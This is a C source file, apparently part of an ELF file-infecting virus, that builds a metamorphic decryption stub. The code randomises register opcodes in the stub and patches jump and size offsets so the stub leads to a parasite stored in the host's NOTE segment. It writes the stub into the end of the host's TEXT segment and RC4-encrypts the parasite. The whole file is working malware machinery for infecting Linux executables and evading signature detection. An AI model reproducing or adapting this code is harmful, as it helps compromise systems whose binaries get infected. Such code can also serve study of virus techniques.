#include <war.h>

////////////////////////////////////////////////////////////////////////////////
/// STATIC FUNCTIONS
////////////////////////////////////////////////////////////////////////////////

__attribute__((always_inline)) static inline void metamorph_stub(void)
{
	char *stub = (char *)L1;
	unsigned short opcode;

	const struct s_metamorph metamorph =
	{
		{RAX, RDI, RSI, RDX, RCX},
		{OFFSET_1, OFFSET_2, OFFSET_3, OFFSET_4, OFFSET_5, OFFSET_6, OFFSET_7, OFFSET_8, OFFSET_9},
	};

	for (register size_t index = 0; index < OFFSET_SIZE; index++)
	{
		opcode = metamorph.code[_get_random_integer(CODE_SIZE)];

		_memcpy(stub + metamorph.offset[index], &opcode, sizeof(unsigned short));
	}
}

__attribute__((always_inline)) static inline void patch_stub(Elf64_Phdr **segment)
{
	char *stub = (char *)L1;

	const size_t size = sizeof(int);
	const size_t stub_size = (void *)__exit - (void *)L1;

	const size_t stub_addr = ((segment[TEXT]->p_vaddr + segment[TEXT]->p_memsz) - stub_size) - ((segment[TEXT]->p_vaddr + segment[TEXT]->p_memsz) - (stub_size - (STUB_OFFSET + JUMP_SIZE)));

	_memcpy(stub + STUB_OFFSET, &stub_addr, size);
	_memcpy(stub + STUB_SIZE_OFFSET, &stub_size, size);

	const size_t parasite_addr = segment[NOTE]->p_vaddr - ((segment[TEXT]->p_vaddr + segment[TEXT]->p_memsz) - (stub_size - (PARASITE_OFFSET + JUMP_SIZE)));
	const size_t parasite_size = ((void *)__exit - (void *)__entry) + FCNT_SIZE;

	_memcpy(stub + PARASITE_OFFSET, &parasite_addr, size);
	_memcpy(stub + PARASITE_SIZE_OFFSET, &parasite_size, size);

	const size_t patch_jump = segment[NOTE]->p_vaddr - ((segment[TEXT]->p_vaddr + segment[TEXT]->p_memsz));

	_memcpy(stub + (stub_size - JUMP_SIZE), &patch_jump, size);
}

__attribute__((always_inline)) static inline void insert_stub(char *dst, Elf64_Phdr **segment)
{
	const char *stub = (char *)L1;
	const size_t stub_size = (void *)__exit - (void *)L1;

	_memcpy(dst + ((segment[TEXT]->p_offset + segment[TEXT]->p_filesz) - stub_size), stub, stub_size);
}

////////////////////////////////////////////////////////////////////////////////
/// PUBLIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

void stub(struct s_host *host, struct s_keychain *keychain, enum e_context context, struct s_injection *injection)
{

#if LOGGER
	MID_LOGGER("stub:\t\t\t");
#endif

	if (context == FAILURE)
		goto label;

	const size_t stub_size = (void *)__exit - (void *)L1;
	const size_t parasite_size = ((void *)__exit - (void *)__entry) + FCNT_SIZE;

	metamorph_stub();
	patch_stub(host->segment);
	insert_stub(injection->ptr, host->segment);

	RC4((unsigned char *)L1, stub_size, injection->ptr + host->segment[NOTE]->p_offset, parasite_size);

label:
	signature(host, keychain, context, injection);
}
